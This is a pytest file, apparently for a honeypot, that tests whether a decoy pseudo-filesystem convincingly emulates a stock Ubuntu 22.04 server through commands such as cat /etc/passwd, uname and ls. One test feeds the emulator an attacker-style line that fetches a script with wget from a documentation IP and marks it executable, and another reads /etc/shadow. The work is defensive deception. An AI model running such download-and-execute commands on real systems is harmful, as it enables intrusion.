"""Pseudo-filesystem realism: standard commands and files behave like stock Ubuntu 22.04."""
from src.decoy.pseudo_fs import PseudoFilesystem


def run(fs, cmd):
    return fs.execute_command(cmd)[0]


def test_system_files_are_realistic():
    fs = PseudoFilesystem("s")
    assert run(fs, "cat /etc/passwd").startswith("root:x:0:0:root:/root:/bin/bash\n")
    assert 'PRETTY_NAME="Ubuntu 22.04.4 LTS"' in run(fs, "cat /etc/os-release")
    assert run(fs, "cat /proc/cpuinfo").count("processor") == 2
    assert run(fs, "cat /etc") == "cat: /etc: Is a directory\n"
    assert "Permission denied" in run(fs, "cat /etc/shadow")
    assert "Automatically generated" not in run(fs, "cat /etc/hostname")


def test_basic_commands_exist_and_agree():
    fs = PseudoFilesystem("s", username="admin")
    assert run(fs, "echo ok") == "ok\n"
    assert run(fs, "whoami") == "admin\n"
    assert run(fs, "id").startswith("uid=1000(admin)")
    assert run(fs, "hostname") == "srv-prod-01\n"
    assert run(fs, "nproc") == "2\n"
    assert "Mem:" in run(fs, "free -m")
    assert run(fs, "which python3") == "/usr/bin/python3\n"
    assert "echo ok" in run(fs, "history")
    assert run(fs, "sudo whoami") == "admin\n"


def test_uname_options():
    fs = PseudoFilesystem("s")
    assert run(fs, "uname") == "Linux\n"
    assert run(fs, "uname -m") == "x86_64\n"
    assert run(fs, "uname -r") == "5.15.0-105-generic\n"
    assert run(fs, "uname -a").startswith("Linux srv-prod-01 5.15.0-105-generic")
    # nproc / cpuinfo / uname all describe the same machine
    assert run(fs, "hostname").strip() in run(fs, "uname -a")


def test_directories_are_consistent():
    fs = PseudoFilesystem("s", username="root")
    assert fs.cwd == "/root"
    assert run(fs, "ls") == ""  # only dotfiles in /root
    assert ".ssh" in run(fs, "ls -la")
    assert run(fs, "ls /etc") != run(fs, "ls /var")
    assert "No such file or directory" in run(fs, "cd /nonexistent")
    assert fs.cwd == "/root"
    assert "cannot access" in run(fs, "ls /nope")


def test_chained_commands_and_downloads_update_state():
    fs = PseudoFilesystem("s")
    out = run(fs, "cd /tmp; wget http://198.51.100.7/x.sh && chmod +x x.sh")
    assert fs.cwd == "/tmp"
    assert "saved" in out
    assert run(fs, "ls") == "x.sh\n"
    run(fs, "rm x.sh")
    assert run(fs, "ls") == ""
